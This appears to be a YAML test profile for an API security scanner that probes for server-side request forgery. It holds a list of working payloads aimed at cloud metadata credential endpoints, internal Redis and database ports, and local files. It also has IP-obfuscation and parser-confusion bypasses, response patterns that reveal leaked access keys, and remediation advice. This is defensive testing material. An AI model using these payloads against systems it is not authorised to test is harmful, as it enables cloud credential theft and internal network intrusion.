# SSRF (Server-Side Request Forgery) - Basic Attack Profile
# Detects endpoints that can be manipulated into making unintended server-side
# requests, potentially exposing internal infrastructure, cloud metadata
# services, or internal APIs.

name: "SSRF - Basic Server-Side Request Forgery"
category: "request-forgery"
severity: "critical"
description: >
  Tests for basic SSRF vulnerabilities via URL parameters, path segments, and
  JSON/XML body fields. Covers cloud metadata probing, IP obfuscation bypass
  techniques, internal network scanning, and blind SSRF detection using
  response time deltas and internal IP disclosure patterns.

# Fields commonly vulnerable to SSRF injection
target_fields:
  - "url"
  - "endpoint"
  - "uri"
  - "href"
  - "link"
  - "redirect"
  - "callback"
  - "webhook"
  - "proxy"
  - "dest"
  - "destination"
  - "fetch"
  - "target"
  - "source"
  - "feed"
  - "image_url"
  - "avatar_url"
  - "host"
  - "site"

# Attack payloads to test (25+ covering GET and POST vectors)
payloads:
  # --- 1. Localhost / loopback access ---
  - "http://127.0.0.1"
  - "http://127.0.0.1:80"
  - "http://127.0.0.1:443"
  - "http://127.0.0.1:8080"
  - "http://localhost"
  - "http://localhost:8080"
  - "http://localhost/admin"
  - "http://[::1]"
  - "http://0.0.0.0"

  # --- 2. Cloud metadata endpoints (AWS) ---
  - "http://169.254.169.254/latest/meta-data/"
  - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  - "http://169.254.169.254/latest/user-data/"
  - "http://169.254.169.254/latest/dynamic/instance-identity/document"

  # --- 3. Cloud metadata endpoints (GCP) ---
  - "http://metadata.google.internal/computeMetadata/v1/"
  - "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

  # --- 4. Cloud metadata endpoints (Azure IMDS) ---
  - "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
  - "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01"

  # --- 5. IP obfuscation bypass techniques ---
  # Decimal representation
  - "http://2130706433/"
  # Hexadecimal representation
  - "http://0x7f000001/"
  # Octal representation
  - "http://0177.0000.0000.0001/"
  # Shortened localhost forms
  - "http://127.1/"
  - "http://0/"
  # URL-encoded localhost
  - "http://%31%32%37%2e%30%2e%30%2e%31/"
  # DNS wildcard services resolving to 127.0.0.1
  - "http://127.0.0.1.nip.io/"
  - "http://localtest.me/"

  # --- 6. Internal subnet probes ---
  - "http://192.168.0.1"
  - "http://192.168.1.1"
  - "http://10.0.0.1"
  - "http://172.16.0.1"
  - "http://10.0.0.1:9200"
  - "http://10.0.0.1:6379"
  - "http://10.0.0.1:27017"

  # --- 7. Protocol smuggling ---
  - "gopher://127.0.0.1:6379/_INFO"
  - "dict://127.0.0.1:6379/INFO"
  - "file:///etc/passwd"
  - "file:///etc/hosts"

  # --- 8. URL parser confusion ---
  - "http://evil.com@127.0.0.1/"
  - "http://127.0.0.1#@evil.com/"
  - "http://127.0.0.1%2523@evil.com/"

  # --- 9. Redirect-based SSRF ---
  - "https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/"
  - "http://attacker.com/redirect?target=http://127.0.0.1/admin"

# Indicators that suggest successful SSRF exploitation
success_indicators:
  response_contains:
    # AWS metadata indicators
    - "ami-id"
    - "instance-id"
    - "instance-type"
    - "security-credentials"
    - "AccessKeyId"
    - "SecretAccessKey"
    # GCP metadata indicators
    - "computeMetadata"
    - "service-accounts"
    - "access_token"
    # Azure metadata indicators
    - "vmId"
    - "subscriptionId"
    # Internal file / service indicators
    - "root:x:"
    - "localhost"
    - "127.0.0.1"
    # Internal service banners
    - "Redis"
    - "MongoDB"
    - "Elasticsearch"
    - "PostgreSQL"
    # DNS / IP disclosure patterns
    - "10.0."
    - "172.16."
    - "192.168."

  status_codes:
    - 200
    - 301
    - 302

  # Blind SSRF ‚Äî response time delta detection
  response_time_gt: 5  # seconds

  # Cloud-specific headers leaked in response
  headers_present:
    - "X-Cloud-Trace-Context"
    - "X-Goog-"

# How to fix this vulnerability
remediation: |
  üîß How to Fix SSRF Vulnerabilities (CWE-918):

  1. **URL Allowlisting**: Only permit requests to known, trusted domains
     ```python
     ALLOWED_HOSTS = {"api.example.com", "cdn.example.com"}

     def is_allowed(url: str) -> bool:
         parsed = urllib.parse.urlparse(url)
         return parsed.hostname in ALLOWED_HOSTS
     ```

  2. **Block Internal IP Ranges**: Deny requests to private/reserved IPs
     ```python
     import ipaddress

     def is_internal(hostname: str) -> bool:
         try:
             ip = ipaddress.ip_address(socket.gethostbyname(hostname))
             return ip.is_private or ip.is_loopback or ip.is_link_local
         except (socket.gaierror, ValueError):
             return True  # Block if resolution fails
     ```

  3. **Disable Unnecessary Protocols**: Only allow http/https
     ```python
     parsed = urllib.parse.urlparse(user_url)
     if parsed.scheme not in ("http", "https"):
         raise ValueError("Unsupported protocol")
     ```

  4. **Block Cloud Metadata Endpoints**:
     - Use IMDSv2 (token-required) on AWS
     - Block 169.254.169.254 at the firewall/network level
     - Set metadata concealment on GCP

  5. **Validate After Redirect Resolution**:
     - Re-check the final destination URL after following redirects
     - Limit the number of redirects followed

  6. **Input Normalisation**:
     - Resolve DNS before applying allowlists to defeat DNS rebinding
     - Canonicalize IP representations (decimal, octal, hex) before validation
     - Reject URLs with credentials (user:pass@host)

  OWASP API Security Top 10 (2023) ‚Äî API8:2023 Security Misconfiguration
  also covers SSRF as a consequence of misconfigured outbound request policies.

references:
  - "https://cwe.mitre.org/data/definitions/918.html"
  - "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"
  - "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html"
  - "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
  - "https://portswigger.net/web-security/ssrf"

cat_message: "I snuck through the cat flap into the server room! üê±üíª (SSRF: server made an unintended internal request)"
